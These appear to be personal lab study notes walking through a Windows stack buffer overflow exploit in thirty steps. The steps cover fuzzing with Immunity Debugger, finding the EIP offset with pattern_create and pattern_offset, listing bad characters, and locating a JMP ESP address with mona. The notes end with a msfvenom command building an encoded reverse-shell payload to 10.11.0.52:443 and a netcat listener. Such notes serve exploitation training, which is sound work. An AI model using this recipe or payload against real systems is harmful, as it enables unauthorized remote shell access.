## Windows Buffer Overflow

1) First we identify the IP, service and the port it is running and make edits in the fuzzer script

**GO TO OPTIONS > APPEARANCE > Change > Font to 10-12 in IMMUNITY * View - CPU doubleclick
2) We start fuzzing with Ollydbg/Immunity AS ADMINISTRATOR running while it is attached to the service**

3) Depending on the no. of bytes which crash the service we see the EIP register pointing to AAAA

4) Next we create a pattern with `pattern_create.rb` of 2700 bytes and fuzz with it as our buffer.

`Usage : pattern_create.rb -l 2700`

5) Load the whole value into the buffer instead of the A's and re-run the fuzzer to crash the service. Re-attch and restart service first

6) Now we have a unique value on the EIP register let's use patter_offset to look for the location to understand EIP overwrite

Usage: `pattern_offset -q Value we found on EIP`

7) Output will be say 2606 that mean we need to overwrite the 4 characters after 2606 to overwrite EIP

8) Let's do this by pushing 2606 A's + 4 B's and 500 C's

9) We see that the EIP register is overwritten by 4 B's that is 42424242 in hex.

10) Now we must see if there is space for our shellcode which is normally 350-400 bytes in space

11) When we send 500 bytes as C's we see in the bottom right window we can double click and it shows relative to ESP the count and we can turn that value ex. 1ac to decimal which is 428 bytes.

12) Now we must find bad characters not allowed in payload. (Note `\x00` is always a badchar so its removed already )

```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
```

13) Let's fire it up in the A * 2606 + B * 4 + badchars in the buffer and see where the debugger starts truncating values that is a badchar for us.

Right click ESP and "Follow in dump" REMEMBER TO VIEW HEX DUMP!!!!!!!!!!!

14) We find \x0a as a badchar we remove and re-fuzz

15) Everything else looks good so remember to remove \x00 is always a badchar from payload

16) Now we have \x00,\x0a,\x0d as badhcharacters. (\x0d is FOUND BY SEEING THE GAP in values 0C and then 0E even though everything else seems good. Always keep in mind!

17) Now we must redirect the execution flow aka find a reliable address to get into our EIP so it will have this instruction JMP ESP and it will point to our shellcode

18 ) For hunting such an address we look into mona.py (Remember to restart the service and run it in Immunity debugger to find the right place)

19) we enter !mona modules in the white bar below to see which address will have False under DEP and ASLR as we need to avoid those

20)  Once we have our candidate we click the 'm' memory mapping and find the same and must have R and E both

21) We then go to Executables by clicking 'e' and double clicking the Vulnerable.dll and we see the code for execution of this dll.

22) To find this JMP ESP we can use nasm.rb inbuilt to generate the opcode so we can use mona to find it in our execution page for us.
```
Usage : nasm_shell.rb
nasm> jmp esp

00000000  FFE4              jmp esp
```
23) We now use `!mona find -s "\xff\xe4" -m vuln.dll`

24) We get a bunch of JMP ESP addresses we pick one with no badcharacters!!!!

25) LEt's write that in our 'B' space but remember they must be written the other way around so here it is
0x5f4a358f and will be written as \x8f\x35\x4a\x5f in place of BBBB

26) Update our script and try to send and see if ESP is what we want it to be it redirects the flow to the CCCCCCCC....
FOR THIS WE PLACE A BREAKPOINT ON THE ADDRESS TO STOP THE PROGRAM AND NOTICE THE EIP WE ENTERED AND THEN CONTINUE IT
Right click on any address and click Go to > Expression and type in the address and boom Toggle the Breakpoint there.

Can pop calc first to see if needed else go for ROOT!

27) Then we see that our the crash should indicate the redirection to the CCCC's

28) Time to generate our payload with badchars specified and encode it
## NOTE : REMEMBER THE FORMAT of how to put badcharacters below no commas !!!!
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.52 LPORT=443 -f py -b "\x00\x0a\x0d" -e x86/shikata_ga_nai `

29) Copy this shellcode after the B's and we must add the no op sleds just a few like 10 and then the shellcode so metasploit can decode this shellcode

30) Setup a netcat listener/multi handler and you're GOLDEN!